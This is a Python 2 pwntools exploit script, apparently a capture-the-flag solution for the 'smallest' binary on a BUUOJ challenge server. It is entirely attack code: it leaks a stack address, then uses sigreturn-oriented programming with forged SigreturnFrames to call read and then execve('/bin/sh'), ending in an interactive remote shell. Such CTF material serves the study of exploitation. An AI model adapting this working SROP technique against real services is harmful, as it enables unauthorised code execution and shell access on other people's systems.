from pwn import *
small = ELF('./smallest')
 
#sh = process('./smallest')
sh = remote("node4.buuoj.cn",28625)
context.arch = 'amd64'
context.log_level = 'debug'
syscall_ret = 0x00000000004000BE
start_addr = 0x00000000004000B0
## set start addr three times
payload = p64(start_addr) * 3
sh.send(payload)
# yes = raw_input()
## modify the return addr to start_addr+3
## so that skip the xor rax,rax; then the rax=1
## get stack addr
sh.send('\xb3')
yes = raw_input()
stack_addr = u64(sh.recv()[8:16])
stack_addr = stack_addr&0xfffffffffffffff000
stack_addr -=0x2000
log.success('leak stack addr :' + hex(stack_addr))
 
## make the rsp point to stack_addr
## the frame is read(0,stack_addr,0x400)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_read
sigframe.rdi = 0
sigframe.rsi = stack_addr
sigframe.rdx = 0x400
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret
payload = p64(start_addr) + 'a' * 8 + str(sigframe)
sh.send(payload)
yes = raw_input()
## set rax=15 and call sigreturn
sigreturn = p64(syscall_ret) + 'b' * 7
sh.send(sigreturn)
yes = raw_input()
## call execv("/bin/sh",0,0)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = stack_addr + 0x190  # "/bin/sh" 's addr
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rsp = stack_addr+ 0x190
sigframe.rip = syscall_ret
 
 
retadd=0x4000C0 
frame_payload = p64(start_addr) + 'b' * 8 + str(sigframe)
print len(frame_payload)
payload = frame_payload + (0x190 - len(frame_payload)) * '\x00' + '/bin/sh\x00'+p64(stack_addr + 0x190)
sh.send(payload)
yes = raw_input()
sh.send(sigreturn)
yes = raw_input()
sh.interactive()